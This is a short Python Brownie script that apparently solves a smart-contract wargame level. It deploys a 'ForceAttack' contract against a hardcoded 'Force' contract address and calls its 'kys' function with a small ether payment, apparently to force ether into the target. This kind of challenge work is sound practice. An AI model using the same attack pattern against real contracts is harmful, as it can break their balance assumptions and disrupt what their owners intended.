from scripts.helpful_scripts import get_account, ONE
from brownie import Force, network, ForceAttack
from web3 import Web3
from web3.auto import w3


def deploy_Force(_owner):
    owner = get_account(index=1)
    force = Force.deploy(
        {"from": owner},
    )
    return force


def deploy_ForceAttack(_ForceAddress):
    account = get_account()
    force_attack = ForceAttack.deploy(
        _ForceAddress,
        {"from": account},
    )
    return force_attack


def main():
    print(network.show_active())
    account = get_account()
    # owner = get_account(index=1)
    # force = deploy_Force(owner)
    force = "0xDb45755d8146aeE285CC6a35D02FAd2E04024FcB"
    force_attack = deploy_ForceAttack(force)
    # balance = force.balance()
    # print(balance)

    force_attack.kys({"from": account, "value": ONE / 1000})
    # balance = force.balance()
    # print(balance)
